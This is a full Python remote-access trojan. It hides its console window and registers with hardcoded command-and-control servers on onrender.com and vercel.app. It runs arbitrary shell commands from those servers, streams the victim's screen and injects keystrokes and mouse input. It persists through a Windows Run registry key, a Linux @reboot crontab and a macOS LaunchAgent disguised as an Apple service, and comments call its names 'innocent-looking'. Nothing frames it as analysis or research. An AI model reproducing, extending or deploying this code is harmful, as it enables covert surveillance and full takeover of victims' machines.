import os
import sys
import subprocess
import platform
import time
import random
import logging
from datetime import datetime

# Setup basic logging until full configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# ==============================
# Package Installation
# ==============================

def check_and_install_packages():
    """Check for required packages and install them if missing."""
    required_packages = [
        "requests",
        "pycryptodome",
        "pyautogui",
        "pillow",
        "keyboard",
        "mouse",
        "websocket-client"
    ]
    
    missing_packages = []
    
    # Check which packages are missing
    for package in required_packages:
        try:
            __import__(package.replace("-", "_"))  # Replace hyphens with underscores for import
        except ImportError:
            missing_packages.append(package)
    
    # If packages are missing, try to install them
    if missing_packages:
        print(f"Installing required packages: {', '.join(missing_packages)}")
        
        # Check if pip is available
        try:
            # Determine pip command (pip or pip3)
            pip_command = "pip"
            if platform.system() != "Windows":
                # Try to use pip3 on Unix systems
                try:
                    subprocess.check_call([
                        "pip3", "--version"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    pip_command = "pip3"
                except:
                    pass
            
            # Install each missing package
            for package in missing_packages:
                print(f"Installing {package}...")
                
                # Handle special cases
                if package == "pycryptodome":
                    install_args = [pip_command, "install", "pycryptodome", "--upgrade"]
                else:
                    install_args = [pip_command, "install", package]
                
                # Run installation with elevated privileges if possible
                if platform.system() == "Windows":
                    # On Windows, try to run with admin rights if possible
                    try:
                        subprocess.check_call(install_args)
                    except subprocess.CalledProcessError:
                        print(f"Failed to install {package}. You may need to run as administrator.")
                        return False
                else:
                    # On Unix systems, try with sudo if regular install fails
                    try:
                        subprocess.check_call(install_args)
                    except subprocess.CalledProcessError:
                        try:
                            print(f"Trying with sudo...")
                            subprocess.check_call(["sudo"] + install_args)
                        except:
                            print(f"Failed to install {package}. You may need to run as root.")
                            return False
            
            print("All required packages installed successfully.")
            
            # Restart the script to use the newly installed packages
            print("Restarting script to use new packages...")
            os.execv(sys.executable, ['python'] + sys.argv)
            
        except Exception as e:
            print(f"Error installing packages: {e}")
            return False
    
    return True

# Check and install required packages before importing them
if not check_and_install_packages():
    print("Failed to install required packages. Exiting.")
    sys.exit(1)

# Now import the required packages
import ssl
import base64
import hashlib
import requests
import uuid
import io
import threading
import socket
import json
import pyautogui
import keyboard
import mouse
from PIL import Image
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import websocket

# ==============================
# Configuration
# ==============================

# Setup logging
logging.basicConfig(
    filename='system_service.log',  # Innocent-looking filename
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# C2 Server Configuration
C2_SERVERS = [
    "https://suninfo.onrender.com/",  # Primary server
    "https://v0-new-project-fhkrfg8taoh.vercel.app/"  # Fallback server (add more if needed)
]
WS_SERVERS = [
    "wss://suninfo.onrender.com/api/socket",  # Primary WebSocket server
    "wss://0-new-project-fhkrfg8taoh.vercel.app/api/socket"  # Fallback WebSocket server
]

# Security Configuration
AES_KEY = hashlib.sha256(b"EynDnmNF4fipxGmiErq0hMOC-lXBuBxgRhIAHQDM8XA").digest()  # 32-byte AES key

# Operational Configuration
SLEEP_TIME = 3600  # Base time between beacons (1 hour)
JITTER = 300  # Random jitter to add to beacon time (5 minutes)
MAX_RETRIES = 3  # Maximum number of retries for network operations
RETRY_DELAY = 5  # Delay between retries in seconds
SCREENSHOT_QUALITY = 50  # Default screenshot quality (1-100)
STREAM_QUALITY = 30  # Default streaming quality (1-100)
DEFAULT_FRAME_RATE = 5  # Default frames per second for streaming

# ==============================
# Global Variables
# ==============================

client_id = None  # Unique identifier for this client
server = None  # Current C2 server URL
ws_server = None  # Current WebSocket server URL
ws = None  # WebSocket connection
ws_connected = False  # WebSocket connection status
ws_lock = threading.Lock()  # Lock for WebSocket operations

# Streaming control
streaming = False  # Flag to control streaming
stream_thread = None  # Thread for screen streaming
frame_rate = DEFAULT_FRAME_RATE  # Current frame rate for streaming

# System information
system_info = None  # Cached system information

# ==============================
# Utility Functions
# ==============================

def get_legitimate_user_agent():
    """Return a random legitimate-looking user agent."""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    ]
    return random.choice(agents)

def log_with_timestamp(message, level="INFO"):
    """Log a message with a timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if level == "ERROR":
        logging.error(f"{timestamp} - {message}")
    elif level == "WARNING":
        logging.warning(f"{timestamp} - {message}")
    else:
        logging.info(f"{timestamp} - {message}")

def retry_operation(operation, *args, **kwargs):
    """Retry an operation with exponential backoff."""
    for attempt in range(MAX_RETRIES):
        try:
            return operation(*args, **kwargs)
        except Exception as e:
            log_with_timestamp(f"Operation failed: {e}", "ERROR")
            if attempt < MAX_RETRIES - 1:
                sleep_time = RETRY_DELAY * (2 ** attempt) + random.uniform(0, 1)
                time.sleep(sleep_time)
    return None

# ==============================
# Encryption Functions
# ==============================

def encrypt_data(data):
    """Encrypt data using AES-256-CBC."""
    try:
        if isinstance(data, str):
            data = data.encode()
        iv = os.urandom(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        return base64.b64encode(iv + encrypted).decode()
    except Exception as e:
        log_with_timestamp(f"Encryption error: {e}", "ERROR")
        return None

def decrypt_data(encrypted_data):
    """Decrypt data using AES-256-CBC."""
    try:
        if isinstance(encrypted_data, str):
            encrypted_data = base64.b64decode(encrypted_data)
        iv = encrypted_data[:16]
        encrypted = encrypted_data[16:]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        return decrypted.decode()
    except Exception as e:
        log_with_timestamp(f"Decryption error: {e}", "ERROR")
        return None

# ==============================
# System Information Functions
# ==============================

def get_system_info():
    """Collect system information."""
    global system_info
    
    if system_info:
        return system_info
        
    try:
        info = {
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "platform": platform.system(),
            "platform_release": platform.release(),
            "platform_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "username": os.getlogin(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Get screen resolution
        try:
            screen_width, screen_height = pyautogui.size()
            info["screen_resolution"] = f"{screen_width}x{screen_height}"
        except:
            info["screen_resolution"] = "Unknown"
            
        system_info = info
        return info
    except Exception as e:
        log_with_timestamp(f"Error getting system info: {e}", "ERROR")
        return {"error": str(e)}

# ==============================
# Screenshot and Screen Streaming Functions
# ==============================

def capture_screenshot(quality=SCREENSHOT_QUALITY):
    """Capture a screenshot and return as base64 string."""
    try:
        # Take a screenshot
        screenshot = pyautogui.screenshot()
        
        # Convert to bytes
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='JPEG', quality=quality)
        img_byte_arr = img_byte_arr.getvalue()
        
        # Convert to base64 string
        return base64.b64encode(img_byte_arr).decode('utf-8')
    except Exception as e:
        log_with_timestamp(f"Screenshot error: {e}", "ERROR")
        return None

def send_frame(frame_data):
    """Send a frame to the C2 server."""
    global ws, ws_connected, client_id, server
    
    # Try WebSocket first if connected
    if ws_connected and ws:
        try:
            with ws_lock:
                ws.send(json.dumps({
                    'type': 'frame',
                    'frame': frame_data
                }))
            return True
        except Exception as e:
            log_with_timestamp(f"WebSocket frame send error: {e}", "ERROR")
            ws_connected = False
    
    # Fall back to HTTP
    try:
        headers = {"User-Agent": get_legitimate_user_agent()}
        encrypted_frame = encrypt_data(frame_data)
        payload = {'client_id': client_id, 'frame': encrypted_frame}
        
        response = requests.post(
            f"{server}/api/frame/{client_id}", 
            json=payload,
            headers=headers,
            timeout=5
        )
        
        return response.status_code == 200
    except Exception as e:
        log_with_timestamp(f"HTTP frame send error: {e}", "ERROR")
        return False

def stream_screen(fps):
    """Stream screen to the C2 server at specified frame rate."""
    global streaming
    
    log_with_timestamp(f"Starting screen stream at {fps} FPS")
    
    interval = 1.0 / fps
    last_frame_time = 0
    
    while streaming:
        current_time = time.time()
        
        # Limit frame rate
        if current_time - last_frame_time >= interval:
            try:
                # Capture and send frame
                frame_data = capture_screenshot(quality=STREAM_QUALITY)
                if frame_data:
                    send_frame(frame_data)
                
                last_frame_time = current_time
            except Exception as e:
                log_with_timestamp(f"Stream error: {e}", "ERROR")
        
        # Small sleep to prevent CPU hogging
        time.sleep(0.01)
    
    log_with_timestamp("Screen streaming stopped")

# ==============================
# Mouse and Keyboard Control Functions
# ==============================

def simulate_mouse_click(x, y, button=0):
    """Simulate a mouse click at the specified coordinates."""
    try:
        # Move mouse to position
        mouse.move(x, y)
        
        # Perform click based on button
        if button == 0:  # Left click
            mouse.click(button='left')
        elif button == 1:  # Middle click
            mouse.click(button='middle')
        elif button == 2:  # Right click
            mouse.click(button='right')
            
        return True
    except Exception as e:
        log_with_timestamp(f"Mouse click error: {e}", "ERROR")
        return False

def simulate_mouse_move(x, y):
    """Move the mouse to the specified coordinates."""
    try:
        mouse.move(x, y)
        return True
    except Exception as e:
        log_with_timestamp(f"Mouse move error: {e}", "ERROR")
        return False

def simulate_key_press(key, is_down):
    """Simulate a key press or release."""
    try:
        if is_down:
            keyboard.press(key)
        else:
            keyboard.release(key)
        return True
    except Exception as e:
        log_with_timestamp(f"Key press error: {e}", "ERROR")
        return False

def simulate_text_input(text):
    """Type the specified text."""
    try:
        keyboard.write(text)
        return True
    except Exception as e:
        log_with_timestamp(f"Text input error: {e}", "ERROR")
        return False

# ==============================
# Command Execution Functions
# ==============================

def execute_shell_command(command):
    """Execute a shell command and return the output."""
    try:
        if platform.system() == "Windows":
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
        
        stdout, stderr = process.communicate(timeout=60)
        
        if stdout:
            output = stdout.decode('utf-8', errors='replace')
        else:
            output = stderr.decode('utf-8', errors='replace')
            
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out after 60 seconds"
    except Exception as e:
        log_with_timestamp(f"Command execution error: {e}", "ERROR")
        return f"Error executing command: {str(e)}"

# ==============================
# C2 Communication Functions
# ==============================

def register_client():
    """Register the client with the C2 server."""
    global client_id, server
    
    # Try to load existing client ID from file
    try:
        if os.path.exists(".client_id"):
            with open(".client_id", "r") as f:
                stored_id = f.read().strip()
                if stored_id:
                    client_id = stored_id
                    log_with_timestamp(f"Loaded existing client ID: {client_id}")
    except Exception as e:
        log_with_timestamp(f"Error loading client ID: {e}", "ERROR")
    
    # If no client ID loaded, generate a new one
    if not client_id:
        client_id = str(uuid.uuid4())
        
        # Try to save client ID to file
        try:
            with open(".client_id", "w") as f:
                f.write(client_id)
        except Exception as e:
            log_with_timestamp(f"Error saving client ID: {e}", "ERROR")
    
    # Try to register with each C2 server
    for server_url in C2_SERVERS:
        if not server_url:
            continue
            
        try:
            headers = {"User-Agent": get_legitimate_user_agent()}
            system_data = get_system_info()
            
            payload = {
                'client_id': client_id,
                'system_info': encrypt_data(json.dumps(system_data))
            }
            
            response = requests.post(
                f"{server_url}/api/register", 
                json=payload,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200 and response.json().get('status') == 'registered':
                log_with_timestamp(f"Registered with server {server_url} as {client_id}")
                server = server_url
                
                # Find corresponding WebSocket server
                for ws_url in WS_SERVERS:
                    if ws_url and server_url in ws_url:
                        global ws_server
                        ws_server = ws_url
                        break
                
                return client_id, server
        except Exception as e:
            log_with_timestamp(f"Registration error with {server_url}: {e}", "ERROR")
            
    return None, None

def check_commands():
    """Check for commands from the C2 server."""
    global client_id, server
    
    try:
        headers = {"User-Agent": get_legitimate_user_agent()}
        response = requests.get(
            f"{server}/api/check/{client_id}",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            command_data = response.json().get('command')
            if command_data:
                try:
                    command = decrypt_data(command_data)
                    return command
                except Exception as e:
                    log_with_timestamp(f"Command decryption error: {e}", "ERROR")
    except Exception as e:
        log_with_timestamp(f"Command check error: {e}", "ERROR")
        
    return None

def send_response(response_text):
    """Send a response to the C2 server."""
    global ws, ws_connected, client_id, server
    
    # Try WebSocket first if connected
    if ws_connected and ws:
        try:
            with ws_lock:
                ws.send(json.dumps({
                    'type': 'response',
                    'response': response_text
                }))
            return True
        except Exception as e:
            log_with_timestamp(f"WebSocket response send error: {e}", "ERROR")
            ws_connected = False
    
    # Fall back to HTTP
    try:
        headers = {"User-Agent": get_legitimate_user_agent()}
        encrypted_response = encrypt_data(response_text)
        payload = {'client_id': client_id, 'response': encrypted_response}
        
        response = requests.post(
            f"{server}/api/response/{client_id}", 
            json=payload,
            headers=headers,
            timeout=10
        )
        
        return response.status_code == 200
    except Exception as e:
        log_with_timestamp(f"HTTP response send error: {e}", "ERROR")
        return False

# ==============================
# Command Processing Functions
# ==============================

def process_special_command(command):
    """Process special commands."""
    global streaming, stream_thread, frame_rate
    
    # Screenshot command
    if command == "SCREENSHOT":
        log_with_timestamp("Processing screenshot command")
        screenshot_data = capture_screenshot()
        if screenshot_data:
            send_frame(screenshot_data)
            send_response("Screenshot captured and sent")
        else:
            send_response("Failed to capture screenshot")
        return True
        
    # Start streaming command
    elif command.startswith("START_STREAM:"):
        try:
            # Extract frame rate
            frame_rate = int(command.split(":")[1])
            frame_rate = min(max(frame_rate, 1), 30)  # Limit between 1-30 FPS
            
            # Stop existing stream if running
            if streaming and stream_thread and stream_thread.is_alive():
                streaming = False
                stream_thread.join(timeout=1.0)
            
            # Start new stream
            streaming = True
            stream_thread = threading.Thread(
                target=stream_screen,
                args=(frame_rate,)
            )
            stream_thread.daemon = True
            stream_thread.start()
            
            send_response(f"Screen streaming started at {frame_rate} FPS")
        except Exception as e:
            log_with_timestamp(f"Start stream error: {e}", "ERROR")
            send_response(f"Error starting stream: {str(e)}")
        return True
        
    # Stop streaming command
    elif command == "STOP_STREAM":
        if streaming and stream_thread:
            streaming = False
            if stream_thread.is_alive():
                stream_thread.join(timeout=1.0)
            send_response("Screen streaming stopped")
        else:
            send_response("No active stream to stop")
        return True
        
    # Mouse click command
    elif command.startswith("MOUSE_CLICK:"):
        try:
            parts = command.split(":")[1].split(",")
            x, y, button = int(parts[0]), int(parts[1]), int(parts[2])
            result = simulate_mouse_click(x, y, button)
            send_response(f"Mouse click at ({x},{y}) button {button}: {'Success' if result else 'Failed'}")
        except Exception as e:
            log_with_timestamp(f"Mouse click command error: {e}", "ERROR")
            send_response(f"Error processing mouse click: {str(e)}")
        return True
        
    # Mouse move command
    elif command.startswith("MOUSE_MOVE:"):
        try:
            parts = command.split(":")[1].split(",")
            x, y = int(parts[0]), int(parts[1])
            result = simulate_mouse_move(x, y)
            send_response(f"Mouse moved to ({x},{y}): {'Success' if result else 'Failed'}")
        except Exception as e:
            log_with_timestamp(f"Mouse move command error: {e}", "ERROR")
            send_response(f"Error processing mouse move: {str(e)}")
        return True
        
    # Key press command
    elif command.startswith("KEY_PRESS:"):
        try:
            parts = command.split(":")[1].split(",")
            key, is_down = parts[0], parts[1] == "1"
            result = simulate_key_press(key, is_down)
            send_response(f"Key {'press' if is_down else 'release'} {key}: {'Success' if result else 'Failed'}")
        except Exception as e:
            log_with_timestamp(f"Key press command error: {e}", "ERROR")
            send_response(f"Error processing key press: {str(e)}")
        return True
        
    # Text input command
    elif command.startswith("TEXT_INPUT:"):
        try:
            text = command.split(":")[1]
            result = simulate_text_input(text)
            send_response(f"Text input: {'Success' if result else 'Failed'}")
        except Exception as e:
            log_with_timestamp(f"Text input command error: {e}", "ERROR")
            send_response(f"Error processing text input: {str(e)}")
        return True
        
    # System info command
    elif command == "SYSINFO":
        try:
            info = get_system_info()
            send_response(json.dumps(info, indent=2))
        except Exception as e:
            log_with_timestamp(f"System info command error: {e}", "ERROR")
            send_response(f"Error getting system info: {str(e)}")
        return True
        
    # Not a special command
    return False

# ==============================
# WebSocket Functions
# ==============================

def on_ws_message(ws, message):
    """Handle incoming WebSocket messages."""
    try:
        data = json.loads(message)
        
        if data.get('type') == 'command':
            command = data.get('command')
            if command:
                if not process_special_command(command):
                    # Execute as shell command
                    response = execute_shell_command(command)
                    send_response(response)
        elif data.get('type') == 'pong':
            log_with_timestamp("Received pong from server", "INFO")
    except Exception as e:
        log_with_timestamp(f"WebSocket message error: {e}", "ERROR")

def on_ws_error(ws, error):
    """Handle WebSocket errors."""
    global ws_connected
    log_with_timestamp(f"WebSocket error: {error}", "ERROR")
    with ws_lock:
        ws_connected = False

def on_ws_close(ws, close_status_code, close_msg):
    """Handle WebSocket connection closure."""
    global ws_connected
    log_with_timestamp(f"WebSocket connection closed: {close_status_code} - {close_msg}", "INFO")
    with ws_lock:
        ws_connected = False

def on_ws_open(ws):
    """Handle WebSocket connection establishment."""
    global ws_connected
    log_with_timestamp("WebSocket connection established", "INFO")
    with ws_lock:
        ws_connected = True
    
    # Send initial ping
    try:
        with ws_lock:
            ws.send(json.dumps({'type': 'ping'}))
    except Exception as e:
        log_with_timestamp(f"Error sending initial ping: {e}", "ERROR")

def connect_websocket():
    """Establish WebSocket connection to the C2 server."""
    global ws, ws_connected, client_id, ws_server
    
    if not ws_server:
        return False
            
    try:
        # Create WebSocket connection
        ws_url = f"{ws_server}?clientId={client_id}"
        ws = websocket.WebSocketApp(
            ws_url,
            on_open=on_ws_open,
            on_message=on_ws_message,
            on_error=on_ws_error,
            on_close=on_ws_close,
            header={"User-Agent": get_legitimate_user_agent()}
        )
        
        # Start WebSocket in a separate thread
        ws_thread = threading.Thread(target=ws.run_forever, kwargs={
            'sslopt': {"cert_reqs": ssl.CERT_NONE},
            'ping_interval': 30,
            'ping_timeout': 10
        })
        ws_thread.daemon = True
        ws_thread.start()
        
        # Wait for connection to establish
        for _ in range(10):
            with ws_lock:
                if ws_connected:
                    return True
            time.sleep(0.5)
    except Exception as e:
        log_with_timestamp(f"WebSocket connection error: {e}", "ERROR")
    
    return False

# ==============================
# Persistence Functions
# ==============================

def setup_persistence():
    """Set up persistence mechanisms based on the platform."""
    try:
        system = platform.system()
        
        if system == "Windows":
            # Windows persistence via registry
            try:
                import winreg
                
                # Get the full path of the current script
                script_path = os.path.abspath(sys.argv[0])
                
                # Open the registry key
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                
                # Set the value
                winreg.SetValueEx(
                    key,
                    "WindowsSystemService",  # Innocent-looking name
                    0,
                    winreg.REG_SZ,
                    f'pythonw "{script_path}"'
                )
                
                # Close the key
                winreg.CloseKey(key)
                
                log_with_timestamp("Windows persistence established via registry")
            except Exception as e:
                log_with_timestamp(f"Windows persistence error: {e}", "ERROR")
                
        elif system == "Linux":
            # Linux persistence via crontab
            try:
                script_path = os.path.abspath(sys.argv[0])
                cron_command = f"@reboot python3 {script_path} > /dev/null 2>&1"
                
                # Add to crontab if not already there
                current_crontab = execute_shell_command("crontab -l 2>/dev/null || echo ''")
                if script_path not in current_crontab:
                    new_crontab = current_crontab + "\n" + cron_command + "\n"
                    with open("/tmp/crontab.tmp", "w") as f:
                        f.write(new_crontab)
                    execute_shell_command("crontab /tmp/crontab.tmp")
                    execute_shell_command("rm /tmp/crontab.tmp")
                    
                log_with_timestamp("Linux persistence established via crontab")
            except Exception as e:
                log_with_timestamp(f"Linux persistence error: {e}", "ERROR")
                
        elif system == "Darwin":  # macOS
            # macOS persistence via launchd
            try:
                script_path = os.path.abspath(sys.argv[0])
                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemservice</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
</dict>
</plist>'''
                
                plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.systemservice.plist")
                with open(plist_path, "w") as f:
                    f.write(plist_content)
                    
                execute_shell_command(f"launchctl load {plist_path}")
                
                log_with_timestamp("macOS persistence established via launchd")
            except Exception as e:
                log_with_timestamp(f"macOS persistence error: {e}", "ERROR")
    except Exception as e:
        log_with_timestamp(f"Persistence setup error: {e}", "ERROR")

# ==============================
# Main Beacon Function
# ==============================

def establish_beacon():
    """Main function for beaconing and communication with the C2 server."""
    global streaming, stream_thread, ws_connected
    
    # Try to establish WebSocket connection
    connect_websocket()
    
    # Main beacon loop
    while True:
        try:
            # Check WebSocket connection and reconnect if needed
            with ws_lock:
                ws_is_connected = ws_connected
                
            if not ws_is_connected:
                connect_websocket()
            
            # If WebSocket is not connected, fall back to HTTP polling
            with ws_lock:
                ws_is_connected = ws_connected
                
            if not ws_is_connected:
                command = check_commands()
                
                if command:
                    # Check if it's a special command
                    if not process_special_command(command):
                        # Execute as shell command
                        response = execute_shell_command(command)
                        send_response(response)
        except Exception as e:
            log_with_timestamp(f"Beacon error: {e}", "ERROR")
            pass  # Fail silently
        
        # Add jitter for slow & low behavior
        sleep_time = SLEEP_TIME + random.randint(0, JITTER)
        log_with_timestamp(f"Sleeping for {sleep_time} seconds")
        time.sleep(sleep_time)

# ==============================
# Cleanup Function
# ==============================

def cleanup():
    """Clean up resources before exiting."""
    global streaming, stream_thread, ws
    
    # Stop streaming if active
    if streaming and stream_thread and stream_thread.is_alive():
        streaming = False
        stream_thread.join(timeout=1.0)
    
    # Close WebSocket connection
    if ws:
        try:
            ws.close()
        except:
            pass

# ==============================
# Main Entry Point
# ==============================

if __name__ == "__main__":
    try:
        # Hide console window on Windows
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Register with C2 server
        client_id, server = register_client()
        if not client_id or not server:
            log_with_timestamp("Failed to register client", "ERROR")
            sys.exit(1)
        
        # Setup persistence
        setup_persistence()
        
        # Start beacon
        establish_beacon()
    except KeyboardInterrupt:
        log_with_timestamp("Keyboard interrupt received", "INFO")
        cleanup()
    except Exception as e: 
        log_with_timestamp(f"Fatal error: {e}", "ERROR")
    finally:
        cleanup()
